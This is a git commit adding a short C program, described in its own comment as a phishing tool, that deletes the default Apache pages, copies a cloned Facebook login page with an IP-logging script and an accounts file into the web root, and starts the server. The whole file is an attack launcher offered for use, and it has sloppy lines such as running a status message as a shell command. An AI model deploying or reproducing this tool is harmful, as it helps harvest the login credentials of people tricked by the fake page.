cd0612be99e90bf208301a223b21bc804ecf553a
buer-0 <72962683+buer-0@users.noreply.github.com>
2020-10-16 07:17:45 -0400

    Add files via upload

---
+++ jamal.c
@@ -0,0 +1,43 @@
+//jamal 1 herramienta de phishing 
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    printf("jamal\n");
+    printf("(1)Facebook\n");
+    printf("(2)instagram\n");
+    int opcion;
+    scanf("%i",&opcion);
+    int opcion2;
+    switch (opcion)
+    {
+    case 1:
+        system("rm /var/www/html/index.html");
+        system("rm /var/www/html/index.nginx-debian.html");
+        system("cp sites/facebook/es/index.html /var/www/html/");
+        system("cp sites/facebook/es/ip.php /var/www/html/");
+        system("cp sites/facebook/es/cuen.txt /var/www/html/");
+        system("/etc/init.d/apache2 start");
+        printf("\nel servidor apache esta corriendo\n");
+        printf("tipee 1 para detener: ");
+        scanf("%i",&opcion2);
+        if (opcion2==1)
+        {
+          system("/etc/init.d/apache2 stop");
+          system("se detuvo");
+        }
+        else
+        {
+            printf("/etc/init.d/apache2 stop para cerrar apache");
+        }
+        
+        system("exit");
+        break;
+    
+    default:
+        printf("eliga una opcion valida: \n");
+        break;
+    }
+}
